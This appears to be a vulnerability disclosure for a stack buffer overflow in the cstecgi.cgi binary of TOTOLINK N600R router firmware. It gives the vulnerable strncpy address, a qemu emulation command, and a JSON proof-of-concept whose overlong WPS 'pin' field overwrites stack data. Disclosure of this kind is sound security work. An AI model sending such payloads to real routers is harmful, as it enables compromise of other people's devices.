# TOTOLINK_N600R_V4.3.0cu.7866_B20220506-buffer overflow

## File information

[](https://github.com/Luanruy/qax#file-information)

TOTOLINK_N600R_V4.3.0cu.7866_B20220506.web Unzipped cstecgi.cgi Download address:  [https://totolink.tw/support_view/N600R](https://totolink.tw/support_view/N600R)

## stack overflow point 0x41ca08

At 41ca08 in function FUN_0041c824, the strncpy function is called, which poses a risk of buffer overflow.
 
### Simulate running in qemu
```bash
#!/bin/bash
sudo  chroot  ./  ./qemu-mips-static\
-E  CONTENT_LENGTH="990"  -g  123  -L  ./lib  \
./web_cste/cgi-bin/cstecgi_41c8dc.cgi  <  ./poke/41ca08_poc.json
```
### json
```json
{
	"topicurl" : "UploadCustomModule/setWiFiWpsConfig",
	"wifiIdx" : "1",
	"wscMode" : "1",
	"wscPinMode" : "1",
	"pin" : "11111111111111111111llllllllllllllllllllabcdDOIT"
}
```

### Operation Results
When checking the current function return, the return value will be taken from $sp+228. After running strncpy, it is found that the value at $sp+288 has been overwritten with "DOIT".
![enter image description here](https://i.miji.bid/2025/05/07/42f9bdbfef870ad5d89a99d89a4fd4f4.png)



